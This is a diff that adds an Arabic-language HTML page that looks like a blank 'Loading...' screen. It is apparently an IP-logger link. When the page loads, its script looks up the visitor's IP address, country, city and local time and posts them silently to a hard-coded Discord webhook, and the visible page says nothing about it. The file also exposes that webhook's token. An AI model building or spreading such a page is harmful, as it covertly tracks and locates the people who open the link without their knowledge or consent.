@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>جارٍ التحميل...</title>
+  <script>
+    window.onload = function () {
+      fetch('https://ipapi.co/json/')
+        .then(res => res.json())
+        .then(data => {
+          const ip = data.ip;
+          const country = data.country_name;
+          const city = data.city;
+          const timezone = data.timezone;
+
+          const now = new Date().toLocaleTimeString('ar-EG', { timeZone: timezone });
+
+          // Webhook الخاص بك
+          const webhookURL = "https://ptb.discord.com/api/webhooks/1352217987423141939/eyFykaQ_eHTd7eEfy54XUDbMt7DHjMpN-ELCnigxMrah5-iUPp5oZvsed5tOLgZcSLUo";
+
+          const payload = {
+            content: `📥 تم فتح الرابط:
+🧠 IP: ${ip}
+🌍 الدولة: ${country}
+🏙️ المدينة: ${city}
+⏰ التوقيت المحلي: ${now}`
+          };
+
+          fetch(webhookURL, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(payload)
+          });
+        });
+    };
+  </script>
+</head>
+<body>
+  <h2>جارٍ المعالجة...</h2>
+</body>
+</html>
